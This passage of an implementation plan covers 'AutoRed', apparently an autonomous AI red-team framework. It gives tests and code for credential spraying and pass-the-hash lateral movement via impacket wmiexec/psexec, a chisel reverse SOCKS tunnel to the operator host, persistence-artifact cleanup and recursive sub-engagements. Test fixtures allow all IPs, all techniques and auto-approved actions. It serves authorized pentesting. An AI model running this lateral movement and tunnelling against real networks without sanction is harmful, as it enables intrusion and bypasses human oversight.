
- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tools/test_cleanup_tools.py -v` → 10 PASS.
Run full suite `uv run pytest -q` → **275 passed, 4 skipped**.

- [ ] **Step 6: Commit**

```bash
git add autored/tools/cleanup.py autored/tools/__init__.py tests/unit/tools/test_cleanup_tools.py
git commit -m "feat: add cleanup execute and verify tools with absence parsing"
```

---

## Task 6: PivotExecutor Sub-Agent

**Files:**
- Create: `autored/subagents/pivotexecutor.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_pivotexecutor.py`

**Interfaces:**
- Consumes: `crackmapexec` (Task 3), `impacket_wmiexec` / `impacket_psexec` / `impacket_smbexec` (Task 2), `PivotRecord` (Task 1).
- Produces:
  - `PivotExecutorOutput(pivot: PivotRecord | None, success: bool, output: str)` — consumed by Task 11 (Lateral Agent).
  - `@tool pivotexecutor_subagent(candidate: dict, engagement_id: str) -> PivotExecutorOutput`. The `candidate` dict is a `PivotCandidate.model_dump()` (keys: `credential_id`, `username`, `cred_type`, `secret_value`, `source_host`, `target_host`, `method`, `confidence`).

Protocol (spec §7.4 "Execute pivot"): step 1 validates the credential with a cheap crackmapexec spray; step 2 opens the method's remote-exec channel with a `whoami` probe and records the `PivotRecord`. A failed validation returns a `success=False` `PivotRecord` — the caller (Task 11) tries the next candidate (Review Focus #2).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_pivotexecutor.py
"""Unit tests for the PivotExecutor sub-agent (Phase 5 Task 6).

Patches the underlying tool wrappers at their canonical module paths
(``autored.subagents.pivotexecutor.crackmapexec`` etc.) — same pattern
as the Phase 4 sub-agent tests.
"""
from unittest.mock import AsyncMock, patch

from autored.subagents.pivotexecutor import pivotexecutor_subagent

_CANDIDATE = {
    "credential_id": "s-1",
    "username": "administrator",
    "cred_type": "hash",
    "secret_value": "31d6cfe0d16ae931b73c59d7e0c089c0",
    "source_host": "192.168.56.22",
    "target_host": "192.168.56.11",
    "method": "wmiexec",
    "confidence": 0.8,
}


def _cme_result(success=True, pwned=True):
    from autored.tools.crackmapexec import CrackmapexecResult
    return CrackmapexecResult(
        host_ip="192.168.56.11", protocol="smb", username="administrator",
        success=success, pwned=pwned, output="SMB ... Pwn3d!",
    )


def _wmi_result(success=True):
    from autored.tools.impacket_remote import ImpacketRemoteResult
    return ImpacketRemoteResult(
        host_ip="192.168.56.11", method="wmiexec", command_executed="whoami",
        output="goaad\\administrator", success=success,
    )


async def test_successful_wmiexec_pivot():
    with patch("autored.subagents.pivotexecutor.crackmapexec") as mock_cme, \
         patch("autored.subagents.pivotexecutor.impacket_wmiexec") as mock_wmi:
        mock_cme.ainvoke = AsyncMock(return_value=_cme_result())
        mock_wmi.ainvoke = AsyncMock(return_value=_wmi_result())
        out = await pivotexecutor_subagent.ainvoke({
            "candidate": _CANDIDATE, "engagement_id": "e1",
        })
    assert out.success is True
    assert out.pivot is not None and out.pivot.success is True
    assert out.pivot.target_host == "192.168.56.11"
    assert out.pivot.credentials_used == ["s-1"]
    # Hash auth: nthash passed through, password empty
    wmi_args = mock_wmi.ainvoke.call_args.kwargs
    assert wmi_args["nthash"] == "31d6cfe0d16ae931b73c59d7e0c089c0"
    assert wmi_args["password"] == ""


async def test_failed_credential_validation_returns_failed_pivot():
    with patch("autored.subagents.pivotexecutor.crackmapexec") as mock_cme, \
         patch("autored.subagents.pivotexecutor.impacket_wmiexec") as mock_wmi:
        mock_cme.ainvoke = AsyncMock(return_value=_cme_result(success=False, pwned=False))
        mock_wmi.ainvoke = AsyncMock()
        out = await pivotexecutor_subagent.ainvoke({
            "candidate": _CANDIDATE, "engagement_id": "e1",
        })
    assert out.success is False
    assert out.pivot is not None and out.pivot.success is False
    mock_wmi.ainvoke.assert_not_awaited()  # no channel without valid creds


async def test_password_candidate_uses_password_auth():
    cand = dict(_CANDIDATE, cred_type="password", secret_value="Password1!",
                method="crackmapexec")
    with patch("autored.subagents.pivotexecutor.crackmapexec") as mock_cme:
        mock_cme.ainvoke = AsyncMock(return_value=_cme_result())
        out = await pivotexecutor_subagent.ainvoke({
            "candidate": cand, "engagement_id": "e1",
        })
    assert out.success is True
    cme_args = mock_cme.ainvoke.call_args.kwargs
    assert cme_args["password"] == "Password1!"
    assert cme_args["nthash"] == ""


async def test_psexec_method_dispatch():
    cand = dict(_CANDIDATE, method="psexec")
    with patch("autored.subagents.pivotexecutor.crackmapexec") as mock_cme, \
         patch("autored.subagents.pivotexecutor.impacket_psexec") as mock_ps:
        mock_cme.ainvoke = AsyncMock(return_value=_cme_result())
        mock_ps.ainvoke = AsyncMock(return_value=_wmi_result())
        out = await pivotexecutor_subagent.ainvoke({
            "candidate": cand, "engagement_id": "e1",
        })
    assert out.success is True
    mock_ps.ainvoke.assert_awaited_once()
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_pivotexecutor.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.pivotexecutor'`

- [ ] **Step 3: Write `autored/subagents/pivotexecutor.py`**

```python
"""PivotExecutor sub-agent (spec §7.4, Phase 5).

Two-step pivot protocol:
  1. **Credential validation** — crackmapexec spray against the target.
     A credential that fails CME auth will fail the remote-exec channel
     too, so this is the cheap gate. (Also yields the ``pwned`` flag.)
  2. **Channel probe** — the candidate method's impacket remote-exec
     tool runs ``whoami``. Success records a :class:`PivotRecord`.

A failed validation or probe returns a ``success=False`` PivotRecord —
the Lateral Agent then tries the next candidate (Review Focus #2).
"""
from datetime import datetime

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.lateral import PivotRecord
from autored.tools.crackmapexec import crackmapexec
from autored.tools.impacket_remote import (
    impacket_psexec,
    impacket_smbexec,
    impacket_wmiexec,
)

log = get_logger("subagents.pivotexecutor")

# method → remote-exec channel tool
_PIVOT_TOOLS = {
    "wmiexec": impacket_wmiexec,
    "psexec": impacket_psexec,
    "smbexec": impacket_smbexec,
}


class PivotExecutorOutput(BaseModel):
    """Result of one pivot execution attempt."""

    pivot: PivotRecord | None = None
    success: bool = False
    output: str = ""


def _cred_kwargs(candidate: dict) -> dict:
    """Map candidate cred fields onto tool auth kwargs (hash wins)."""
    password = candidate["secret_value"] if candidate["cred_type"] == "password" else ""
    nthash = candidate["secret_value"] if candidate["cred_type"] == "hash" else ""
    return {"password": password, "nthash": nthash}


@tool
async def pivotexecutor_subagent(
    candidate: dict,
    engagement_id: str = "",
) -> PivotExecutorOutput:
    """Execute a lateral pivot: validate creds, then open a remote-exec channel.

    Args:
        candidate: A PivotCandidate.model_dump() dict — credential_id,
            username, cred_type, secret_value, source_host, target_host,
            method, confidence.
        engagement_id: Current engagement ID.

    Returns:
        PivotExecutorOutput with the executed PivotRecord (success or
        failure) for the Lateral Agent to record / skip past.
    """
    target = candidate["target_host"]
    method = candidate["method"]
    username = candidate["username"]
    auth = _cred_kwargs(candidate)
    log.info("pivotexecutor_start", target=target, method=method, user=username)

    # Step 1: credential validation spray
    cme = await crackmapexec.ainvoke({
        "protocol": "smb",
        "target": target,
        "username": username,
        **auth,
        "engagement_id": engagement_id,
    })

    pivot = PivotRecord(
        target_host=target,
        method=method,
        credentials_used=[candidate["credential_id"]],
        needs_tunnel=False,
        timestamp=datetime.utcnow(),
    )

    if not cme.success:
        log.info("pivotexecutor_creds_invalid", target=target, user=username)
        return PivotExecutorOutput(
            pivot=pivot, success=False, output=cme.output,
        )

    # Step 2: channel probe via the method's remote-exec tool
    channel = _PIVOT_TOOLS.get(method)
    if channel is not None:
        probe = await channel.ainvoke({
            "username": username,
            **auth,
            "target": target,
            "command": "whoami",
            "engagement_id": engagement_id,
        })
        pivot.success = probe.success
        output = probe.output
    else:
        # crackmapexec-only methods: CME success IS the pivot
        pivot.success = True
        output = cme.output

    log.info(
        "pivotexecutor_done", target=target, method=method, success=pivot.success,
    )
    return PivotExecutorOutput(pivot=pivot, success=pivot.success, output=output)
```

- [ ] **Step 4: Export from `autored/subagents/__init__.py`**

Append (matching the existing export style):

```python
from autored.subagents.pivotexecutor import pivotexecutor_subagent
```

(and add to `__all__` if the module maintains one — check first).

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_pivotexecutor.py -v` → 4 PASS.
Run full suite `uv run pytest -q` → **279 passed, 4 skipped**.

- [ ] **Step 6: Commit**

```bash
git add autored/subagents/pivotexecutor.py autored/subagents/__init__.py tests/unit/subagents/test_pivotexecutor.py
git commit -m "feat: add PivotExecutor sub-agent with CME validation and channel probe"
```

---

## Task 7: TunnelSetup Sub-Agent

**Files:**
- Create: `autored/subagents/tunnelsetup.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_tunnelsetup.py`

**Interfaces:**
- Consumes: `chisel_reverse` (Task 4), `TunnelConfig` (Task 1).
- Produces:
  - `TunnelSetupOutput(tunnel: TunnelConfig | None)` — consumed by Task 11.
  - `@tool tunnelsetup_subagent(pivot: dict, engagement_id: str) -> TunnelSetupOutput`. The `pivot` dict is a `PivotRecord.model_dump()`.

Default policy: a chisel reverse SOCKS tunnel back to the AutoRed host (`AUTORED_LHOST`), because the pivot target may sit on a subnet the AutoRed host can't route to. The sub-agent is a thin wrapper — the tool already records config + teardown.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_tunnelsetup.py
"""Unit tests for the TunnelSetup sub-agent (Phase 5 Task 7)."""
from unittest.mock import AsyncMock, patch

from autored.subagents.tunnelsetup import tunnelsetup_subagent
from autored.tools.tunnel import TunnelResult, _config_from_chisel


async def test_tunnelsetup_returns_config():
    cfg = _config_from_chisel("10.10.14.5", 1080, "0.0.0.0/0")
    result = TunnelResult(
        command_built="chisel client 10.10.14.5:1080 R:socks",
        tunnel_config=cfg, success=True, raw_output_path="",
    )
    with patch("autored.subagents.tunnelsetup.chisel_reverse") as mock_chisel:
        mock_chisel.ainvoke = AsyncMock(return_value=result)
        out = await tunnelsetup_subagent.ainvoke({
            "pivot": {"target_host": "192.168.56.11", "method": "wmiexec",
                      "needs_tunnel": True},
            "engagement_id": "e1",
        })
    assert out.tunnel is not None
    assert out.tunnel.tool == "chisel"
    assert out.tunnel.teardown_command.startswith("pkill")
    # lhost is left empty so the tool resolves AUTORED_LHOST itself
    chisel_args = mock_chisel.ainvoke.call_args.kwargs
    assert chisel_args["lhost"] == ""
    assert chisel_args["lport"] == 1080


async def test_tunnelsetup_handles_tool_failure():
    with patch("autored.subagents.tunnelsetup.chisel_reverse") as mock_chisel:
        mock_chisel.ainvoke = AsyncMock(side_effect=RuntimeError("no chisel binary"))
        out = await tunnelsetup_subagent.ainvoke({
            "pivot": {"target_host": "192.168.56.11", "method": "wmiexec",
                      "needs_tunnel": True},
            "engagement_id": "e1",
        })
    assert out.tunnel is None  # tunnel failure must not kill the pivot
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_tunnelsetup.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.tunnelsetup'`

- [ ] **Step 3: Write `autored/subagents/tunnelsetup.py`**

```python
"""TunnelSetup sub-agent (spec §7.4, Phase 5).

Sets up a pivot tunnel when ``PivotRecord.needs_tunnel`` is True.
Default: a chisel reverse SOCKS tunnel back to the AutoRed host
(``AUTORED_LHOST``), because the pivot target may sit on a subnet the
AutoRed host can't route to. Thin wrapper — the chisel tool already
records the TunnelConfig **including its teardown command**.

A tunnel failure returns ``tunnel=None`` — it must never kill the
pivot itself (the pivot already succeeded; the tunnel is optional
reachability).
"""
from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.lateral import TunnelConfig
from autored.tools.tunnel import chisel_reverse

log = get_logger("subagents.tunnelsetup")


class TunnelSetupOutput(BaseModel):
    """Result of a tunnel bring-up attempt."""

    tunnel: TunnelConfig | None = None


@tool
async def tunnelsetup_subagent(
    pivot: dict,
    engagement_id: str = "",
) -> TunnelSetupOutput:
    """Set up a tunnel for a completed pivot.

    Args:
        pivot: A PivotRecord.model_dump() dict (needs_tunnel=True).
        engagement_id: Current engagement ID.

    Returns:
        TunnelSetupOutput with the TunnelConfig, or tunnel=None when
        the bring-up failed (non-fatal — the pivot stands).
    """
    target = pivot.get("target_host", "unknown")
    log.info("tunnelsetup_start", target=target)
    try:
        result = await chisel_reverse.ainvoke({
            "lhost": "",  # default → AUTORED_LHOST inside the tool
            "lport": 1080,
            "target_network": "0.0.0.0/0",
            "engagement_id": engagement_id,
        })
        log.info("tunnelsetup_done", target=target,
                 teardown=result.tunnel_config.teardown_command)
        return TunnelSetupOutput(tunnel=result.tunnel_config)
    except Exception as exc:  # noqa: BLE001 — tunnel is best-effort
        log.warning("tunnelsetup_failed", target=target, error=str(exc))
        return TunnelSetupOutput(tunnel=None)
```

- [ ] **Step 4: Export from `autored/subagents/__init__.py`**

```python
from autored.subagents.tunnelsetup import tunnelsetup_subagent
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_tunnelsetup.py -v` → 2 PASS.
Run full suite `uv run pytest -q` → **281 passed, 4 skipped**.

- [ ] **Step 6: Commit**

```bash
git add autored/subagents/tunnelsetup.py autored/subagents/__init__.py tests/unit/subagents/test_tunnelsetup.py
git commit -m "feat: add TunnelSetup sub-agent wrapping chisel reverse tunnel"
```

---

## Task 8: ArtifactRemover Sub-Agent

**Files:**
- Create: `autored/subagents/artifactremover.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_artifactremover.py`

**Interfaces:**
- Consumes: `cleanup_execute` (Task 5), `CleanupResult` / `HostCleanupPlan` (Task 1).
- Produces:
  - `ArtifactRemoverOutput(results: list[CleanupResult])` — consumed by Task 12 (Cleanup Agent).
  - `@tool artifactremover_subagent(host_plan: dict, artifacts: list[dict], engagement_id: str) -> ArtifactRemoverOutput`. `host_plan` is a `HostCleanupPlan.model_dump()` (carries transport + credentials); `artifacts` is a list of `PersistenceArtifact.model_dump()` dicts (each with `id`, `host_ip`, `method`, `details`, `removal_command`).

A failed removal produces a `CleanupResult` with `success=False`, the error preserved, and `verified=False` — never silently green (Review Focus #5).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_artifactremover.py
"""Unit tests for the ArtifactRemover sub-agent (Phase 5 Task 8)."""
from datetime import datetime
from unittest.mock import AsyncMock, patch

from autored.subagents.artifactremover import artifactremover_subagent
from autored.models.cleanup import CleanupResult
from autored.models.postex import PersistenceArtifact
from autored.tools.cleanup import CleanupExecutionResult

_HOST_PLAN = {
    "host_ip": "192.168.56.22",
    "artifact_ids": ["a-1", "a-2"],
    "removal_commands": ["schtasks /delete /tn AutoRedUpdate /f"],
    "tunnel_teardowns": [],
    "temp_files": [],
    "transport": "impacket_wmiexec",
    "username": "administrator",
    "password": "",
    "nthash": "abc123",
}


def _artifact(aid: str) -> dict:
    return PersistenceArtifact(
        id=aid, host_ip="192.168.56.22", method="scheduled_task",
        details={"task_name": "AutoRedUpdate", "command": "powershell -enc x"},
        removal_command="schtasks /delete /tn AutoRedUpdate /f",
        foothold_id="f-1",
    ).model_dump()


def _exec_result(success=True):
    return CleanupExecutionResult(
        host_ip="192.168.56.22",
        removal_command="schtasks /delete /tn AutoRedUpdate /f",
        transport="impacket_wmiexec",
        success=success, output="SUCCESS: The scheduled task was deleted.",
        error=None if success else "STATUS_LOGON_FAILURE",
    )


async def test_removes_all_artifacts():
    artifacts = [_artifact("a-1"), _artifact("a-2")]
    with patch("autored.subagents.artifactremover.cleanup_execute") as mock_exec:
        mock_exec.ainvoke = AsyncMock(return_value=_exec_result())
        out = await artifactremover_subagent.ainvoke({
            "host_plan": _HOST_PLAN, "artifacts": artifacts,
            "engagement_id": "e1",
        })
    assert len(out.results) == 2
    assert all(r.success and not r.verified for r in out.results)
    # credentials passed through from the host plan
    exec_args = mock_exec.ainvoke.call_args.kwargs
    assert exec_args["nthash"] == "abc123"
    assert exec_args["transport"] == "impacket_wmiexec"
    # removal command passed verbatim from the artifact
    assert exec_args["removal_command"].startswith("schtasks /delete")


async def test_failed_removal_recorded_with_error():
    """Review Focus #5: failed removal → success=False, error set,
    verified=False. Never silently green."""
    artifacts = [_artifact("a-1")]
    with patch("autored.subagents.artifactremover.cleanup_execute") as mock_exec:
        mock_exec.ainvoke = AsyncMock(return_value=_exec_result(success=False))
        out = await artifactremover_subagent.ainvoke({
            "host_plan": _HOST_PLAN, "artifacts": artifacts,
            "engagement_id": "e1",
        })
    assert len(out.results) == 1
    r = out.results[0]
    assert r.success is False
    assert r.verified is False
    assert r.error == "STATUS_LOGON_FAILURE"


async def test_empty_artifact_list_is_noop():
    with patch("autored.subagents.artifactremover.cleanup_execute") as mock_exec:
        out = await artifactremover_subagent.ainvoke({
            "host_plan": _HOST_PLAN, "artifacts": [],
            "engagement_id": "e1",
        })
    assert out.results == []
    mock_exec.ainvoke.assert_not_awaited()
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_artifactremover.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.artifactremover'`

- [ ] **Step 3: Write `autored/subagents/artifactremover.py`**

```python
"""ArtifactRemover sub-agent (spec §7.4, Phase 5).

Executes every artifact's ``removal_command`` **verbatim** (spec §6.4:
"Every persistence action creates a PersistenceArtifact with the exact
removal command. Cleanup Agent runs these verbatim.") on the artifact's
host, transported per the host plan (impacket-wmiexec for Windows /
ssh for Linux) and authenticated with the engagement credentials
recorded in the host plan.

A failed removal is recorded with the error and ``verified=False`` —
the VerificationScanner only flips ``verified`` after an absence proof
(Review Focus #5).
"""
from datetime import datetime

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.models.cleanup import CleanupResult
from autored.tools.cleanup import cleanup_execute

log = get_logger("subagents.artifactremover")


class ArtifactRemoverOutput(BaseModel):
    """Removal outcomes for one host's artifacts."""

    results: list[CleanupResult] = Field(default_factory=list)


@tool
async def artifactremover_subagent(
    host_plan: dict,
    artifacts: list[dict],
    engagement_id: str = "",
) -> ArtifactRemoverOutput:
    """Execute removal commands for one host's artifacts.

    Args:
        host_plan: A HostCleanupPlan.model_dump() — carries transport,
            username, password, nthash for the host.
        artifacts: PersistenceArtifact.model_dump() dicts for this host.
        engagement_id: Current engagement ID.

    Returns:
        ArtifactRemoverOutput with one CleanupResult per artifact
        (``verified`` is always False here — verification is the
        VerificationScanner's job).
    """
    host_ip = host_plan.get("host_ip", "unknown")
    log.info("artifactremover_start", host_ip=host_ip, count=len(artifacts))
    results: list[CleanupResult] = []
    for artifact in artifacts:
        removal = await cleanup_execute.ainvoke({
            "host_ip": artifact["host_ip"],
            "removal_command": artifact["removal_command"],
            "transport": host_plan.get("transport", "impacket_wmiexec"),
            "username": host_plan.get("username", ""),
            "password": host_plan.get("password", ""),
            "nthash": host_plan.get("nthash", ""),
            "engagement_id": engagement_id,
        })
        results.append(CleanupResult(
            artifact_id=artifact["id"],
            host_ip=artifact["host_ip"],
            removal_command=artifact["removal_command"],
            success=removal.success,
            verified=False,  # verification is the scanner's job
            error=removal.error,
            timestamp=datetime.utcnow(),
        ))
        log.info(
            "artifactremover_item", host_ip=artifact["host_ip"],
            artifact_id=artifact["id"], success=removal.success,
        )
    log.info("artifactremover_done", host_ip=host_ip, removed=len(results))
    return ArtifactRemoverOutput(results=results)
```

- [ ] **Step 4: Export from `autored/subagents/__init__.py`**

```python
from autored.subagents.artifactremover import artifactremover_subagent
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_artifactremover.py -v` → 3 PASS.
Run full suite `uv run pytest -q` → **284 passed, 4 skipped**.

- [ ] **Step 6: Commit**

```bash
git add autored/subagents/artifactremover.py autored/subagents/__init__.py tests/unit/subagents/test_artifactremover.py
git commit -m "feat: add ArtifactRemover sub-agent executing verbatim removal commands"
```

---

## Task 9: VerificationScanner Sub-Agent

**Files:**
- Create: `autored/subagents/verificationscanner.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_verificationscanner.py`

**Interfaces:**
- Consumes: `cleanup_verify` + `_build_verify_command` (Task 5), `CleanupResult` (Task 1).
- Produces:
  - `VerificationScannerOutput(results: list[CleanupResult])` — consumed by Task 12.
  - `@tool verificationscanner_subagent(host_plan: dict, artifacts: list[dict], engagement_id: str) -> VerificationScannerOutput`. Same argument shapes as Task 8.

The scanner is the "re-scan to verify artifacts removed" half of spec §13.5's ship criteria. Per artifact it builds the method-specific verify command, runs it through the same transport, and parses for absence (Task 5's `_artifact_absent`). The result `CleanupResult` records `verified` — with `error` set when the artifact is still present.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_verificationscanner.py
"""Unit tests for the VerificationScanner sub-agent (Phase 5 Task 9)."""
from unittest.mock import AsyncMock, patch

from autored.subagents.verificationscanner import verificationscanner_subagent
from autored.models.postex import PersistenceArtifact
from autored.tools.cleanup import CleanupVerificationResult


def _artifact(method: str = "scheduled_task", details: dict | None = None) -> dict:
    return PersistenceArtifact(
        id="a-1", host_ip="192.168.56.22", method=method,
        details=details if details is not None else {"task_name": "AutoRedUpdate"},
        removal_command="schtasks /delete /tn AutoRedUpdate /f",
        foothold_id="f-1",
    ).model_dump()


_HOST_PLAN = {
    "host_ip": "192.168.56.22", "artifact_ids": ["a-1"],
    "removal_commands": [], "tunnel_teardowns": [], "temp_files": [],
    "transport": "impacket_wmiexec", "username": "administrator",
    "password": "", "nthash": "abc123",
}


def _verify_result(verified: bool, output: str) -> CleanupVerificationResult:
    return CleanupVerificationResult(
        host_ip="192.168.56.22",
        verify_command='schtasks /query /tn "AutoRedUpdate"',
        transport="impacket_wmiexec",
        verified=verified, output=output,
    )


async def test_verified_absence():
    with patch("autored.subagents.verificationscanner.cleanup_verify") as mock_v:
        mock_v.ainvoke = AsyncMock(return_value=_verify_result(
            True, "ERROR: The system cannot find the file specified.",
        ))
        out = await verificationscanner_subagent.ainvoke({
            "host_plan": _HOST_PLAN, "artifacts": [_artifact()],
            "engagement_id": "e1",
        })
    assert len(out.results) == 1
    assert out.results[0].verified is True
    assert out.results[0].error is None
    # verify command built from the artifact's method + details
    v_args = mock_v.ainvoke.call_args.kwargs
    assert "schtasks /query" in v_args["verify_command"]
    assert "AutoRedUpdate" in v_args["verify_command"]
    assert v_args["method"] == "scheduled_task"


async def test_artifact_still_present_marks_unverified_with_error():
    """Review Focus #5: still-present artifact → verified=False and an
    error message — visible in the final state, never silently green."""
    with patch("autored.subagents.verificationscanner.cleanup_verify") as mock_v:
        mock_v.ainvoke = AsyncMock(return_value=_verify_result(
            False, "TaskName: AutoRedUpdate  Next Run: ...",
        ))
        out = await verificationscanner_subagent.ainvoke({
            "host_plan": _HOST_PLAN, "artifacts": [_artifact()],
            "engagement_id": "e1",
        })
    assert out.results[0].verified is False
    assert out.results[0].error is not None
    assert "still present" in out.results[0].error


async def test_registry_artifact_uses_reg_query():
    art = _artifact("registry_run", {"key_path": "HKCU\\...\\Run", "value_name": "AutoRed"})
    with patch("autored.subagents.verificationscanner.cleanup_verify") as mock_v:
        mock_v.ainvoke = AsyncMock(return_value=_verify_result(True, "not found"))
        await verificationscanner_subagent.ainvoke({
            "host_plan": _HOST_PLAN, "artifacts": [art], "engagement_id": "e1",
        })
    v_args = mock_v.ainvoke.call_args.kwargs
    assert "reg query" in v_args["verify_command"]
    assert "AutoRed" in v_args["verify_command"]
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_verificationscanner.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.verificationscanner'`

- [ ] **Step 3: Write `autored/subagents/verificationscanner.py`**

```python
"""VerificationScanner sub-agent (spec §7.4, Phase 5).

The "re-scan to verify artifacts removed" half of the Phase 5 ship
criteria (spec §13.5: "Cleanup Agent successfully removes all
artifacts (verifiable via re-scan) / No artifacts remain after
cleanup"). Per artifact: build the method-specific verify command
(Task 5's ``_build_verify_command``), run it through the same
transport, parse for absence. The result CleanupResult records
``verified`` — with ``error`` set when the artifact is still present
(Review Focus #5).
"""
from datetime import datetime

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.models.cleanup import CleanupResult
from autored.tools.cleanup import _build_verify_command, cleanup_verify

log = get_logger("subagents.verificationscanner")


class VerificationScannerOutput(BaseModel):
    """Verification outcomes for one host's artifacts."""

    results: list[CleanupResult] = Field(default_factory=list)


@tool
async def verificationscanner_subagent(
    host_plan: dict,
    artifacts: list[dict],
    engagement_id: str = "",
) -> VerificationScannerOutput:
    """Re-scan a host to verify its artifacts were removed.

    Args:
        host_plan: A HostCleanupPlan.model_dump() — transport + creds.
        artifacts: PersistenceArtifact.model_dump() dicts for this host.
        engagement_id: Current engagement ID.

    Returns:
        VerificationScannerOutput with one CleanupResult per artifact;
        ``verified`` is True only on proven absence.
    """
    host_ip = host_plan.get("host_ip", "unknown")
    log.info("verificationscanner_start", host_ip=host_ip, count=len(artifacts))
    results: list[CleanupResult] = []
    for artifact in artifacts:
        verify_cmd = _build_verify_command(artifact["method"], artifact.get("details") or {})
        scan = await cleanup_verify.ainvoke({
            "host_ip": artifact["host_ip"],
            "verify_command": verify_cmd,
            "method": artifact["method"],
            "transport": host_plan.get("transport", "impacket_wmiexec"),
            "username": host_plan.get("username", ""),
            "password": host_plan.get("password", ""),
            "nthash": host_plan.get("nthash", ""),
            "engagement_id": engagement_id,
        })
        results.append(CleanupResult(
            artifact_id=artifact["id"],
            host_ip=artifact["host_ip"],
            removal_command=verify_cmd,
            success=True,
            verified=scan.verified,
            error=None if scan.verified else
            f"artifact {artifact['id']} still present on {artifact['host_ip']}",
            timestamp=datetime.utcnow(),
        ))
        log.info(
            "verificationscanner_item", host_ip=artifact["host_ip"],
            artifact_id=artifact["id"], verified=scan.verified,
        )
    log.info("verificationscanner_done", host_ip=host_ip, scanned=len(results))
    return VerificationScannerOutput(results=results)
```

- [ ] **Step 4: Export from `autored/subagents/__init__.py`**

```python
from autored.subagents.verificationscanner import verificationscanner_subagent
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_verificationscanner.py -v` → 3 PASS.
Run full suite `uv run pytest -q` → **287 passed, 4 skipped**.

- [ ] **Step 6: Commit**

```bash
git add autored/subagents/verificationscanner.py autored/subagents/__init__.py tests/unit/subagents/test_verificationscanner.py
git commit -m "feat: add VerificationScanner sub-agent with absence re-scan"
```

---

## Task 10: Sub-Engagement Spawner (Recursive Graph Launcher)

**Files:**
- Create: `autored/agents/sub_engagement.py`
- Test: `tests/integration/test_sub_engagement.py`

**Interfaces:**
- Consumes: `build_phase4_graph` from `autored.graph` (the Phase 4 graph — **no lateral node inside, recursion structurally capped**); `init_engagement_folder(engagement_id, target, operator)` and `save_state_to_disk(engagement_id, state)` from `autored.persistence.filesystem`; `make_checkpointer(engagement_id)` from `autored.persistence.sqlite_saver`; `register_roe` from `autored.roe_guard`.
- Produces:
  - `SubEngagementDepthError(Exception)` — raised when a spawn is attempted from a state that is itself a sub-engagement (Review Focus #3).
  - `async spawn_sub_engagement(parent_state: EngagementState, sub_id: str, target_host: str, pivot_method: str, credentials: list[str]) -> EngagementState` — returns the sub-engagement's final state (with `phase == "done"` on success). Consumed by Task 11 (Lateral Agent); integration tests patch it at `autored.agents.lateral.spawn_sub_engagement`.

Semantics (spec §7.2 "sub-graph recursion"): own engagement ID, own folder, own checkpoint DB, `parent_engagement_id` linked, RoE narrowed to `[target_host]`, EventBus inherited from the parent (so sandbox auto-approve / TUI responses flow), parent gets a `SubEngagementRef` summary (Task 11's job).

- [ ] **Step 1: Write the failing tests**

```python
# tests/integration/test_sub_engagement.py
"""Integration tests for the sub-engagement spawner (Phase 5 Task 10).

The happy path runs a REAL Phase 4 graph with every LLM call mocked at
the router level (same fixture files as ``test_phase4_pipeline.py``)
and the exploit / postex nodes no-op'd **at the graph module level**
(``autored.graph.exploit_node`` — graph.py binds node functions at
import time, so patching ``autored.agents.exploit.exploit_node`` would
NOT intercept them; this is the dual-import pattern documented in
``autored/agents/postex.py``). Asserts: own engagement folder +
checkpoint DB under ``engagements/<sub_id>/``, parent link set, scope
narrowed, final state hydrated as EngagementState. The depth-cap test
verifies spawning from a sub-state raises.
"""
import json
import pytest
from pathlib import Path
from unittest.mock import AsyncMock, patch

from autored.state import EngagementState
from autored.models.roe import RulesOfEngagement
from autored.agents.sub_engagement import (
    SubEngagementDepthError,
    spawn_sub_engagement,
)

FIXTURES = Path(__file__).parents[2] / "tests" / "fixtures"


async def async_noop_node(state):
    """Test double for a LangGraph node (no-op → straight to done)."""
    return {"phase": "done"}


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="sub", operator="op", operator_signature="s",
        allowed_ips=["0.0.0.0/0"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, kernel_exploits_allowed=True,
        hitl_mode="auto_approve",
    )


def _parent(tmp_path, monkeypatch) -> EngagementState:
    monkeypatch.chdir(tmp_path)
    return EngagementState(
        engagement_id="parent-1",
        target_scope=["192.168.56.22"],
        operator="op",
        rules_of_engagement=_roe(),
    )


async def test_depth_cap_raises_from_sub_state(tmp_path, monkeypatch):
    """Review Focus #3: spawning from a sub-engagement raises."""
    parent = _parent(tmp_path, monkeypatch)
    parent.parent_engagement_id = "grandparent-1"
    with pytest.raises(SubEngagementDepthError):
        await spawn_sub_engagement(
            parent_state=parent, sub_id="parent-1_sub_01",
            target_host="192.168.56.11", pivot_method="wmiexec",
            credentials=["s-1"],
        )


